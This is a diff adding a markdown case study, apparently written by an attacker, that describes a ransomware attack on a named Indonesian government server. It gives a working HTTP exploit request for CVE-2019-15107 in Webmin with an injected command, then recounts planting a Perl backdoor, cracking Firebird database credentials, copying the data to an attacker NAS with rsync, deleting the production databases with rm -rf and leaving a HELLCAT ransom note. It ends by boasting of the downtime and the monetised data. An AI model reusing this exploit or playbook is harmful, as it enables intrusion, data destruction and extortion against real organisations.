@@ -208,3 +208,78 @@ python3 poc.py target_url
 **Result:** Reverse shell obtained
 
 ## Case Study: Indonesian Government Ransomware Attack
+
+**Target:** [bppkad.blorakab.go.id](https://bppkad.blorakab.go.id/)
+
+### Vulnerability Details
+- **CVE-2019-15107** in Webmin
+- *Custom Python checker available (DM for script)*
+- Webmin 1.890 contained backdoor allowing root command execution
+- Versions 1.900-1.920 required:
+  - Enabled password change feature at:  
+    `Webmin -> Webmin Configuration -> Authentication`
+
+### Proof of Concept
+```http
+POST /password_change.cgi HTTP/1.1
+Host: 10.11.1.88:10000
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+Connection: close
+Cookie: redirect=1; testing=1; sid=x; sessiontest=1
+Referer: http://10.11.1.88:10000/session_login.cgi
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 60
+
+expired=id
+```
+
+### Attack Execution
+
+**1. Backdoor Installation**
+- Added Perl backdoor to `/var/www/html` for persistent access
+- Verified via listener before proceeding
+
+**2. Target Recon**
+- Disk usage analysis:
+  ```
+  145G    /
+  111G    /home
+  110G    /home/backup-db/efinance
+  110G    /home/backup-db
+  51G     /home/backup-db/efinance/2021
+  34G     /home/backup-db/efinance/2019
+  29G     /var
+  27G     /var/databases/firebird
+  27G     /var/databases
+  24G     /home/backup-db/efinance/2020
+  ```
+- Key discoveries:
+  1. Primary database server
+  2. Backups stored on production systems
+  3. Firebird DBMS in use
+
+**3. Data Exfiltration**
+- Cracked Firebird default credentials
+- Mounted attacker NAS
+- Exfiltrated via `rsync`
+
+**4. Ransom Deployment**
+- Executed `rm -rf` on production databases
+- Left ransom note:
+  ```bash
+  └─# ssh -i ./indgov root@180.214.248.20 -p 2222
+  Linux bppkad-dbserver 4.9.0-19-amd64 #1 SMP Debian 4.9.320-2 (2022-06-30) x86_64
+  IMPORTANT!!! IMPORTANT!!! IMPORTANT!!! IMPORTANT!!! IMPORTANT!!!
+  
+  Your files have been ENCRYPTED AND STOLEN by the HELLCAT Ransomware Group.
+  View the note to see how to get your data.
+  'HOW TO GET YOUR DATA.txt' in every main directory.
+  ```
+- Immediate effect: Site showed database connection errors
+
+### Outcome
+- **14+ days downtime** at time of writing  
+- Data successfully monetized
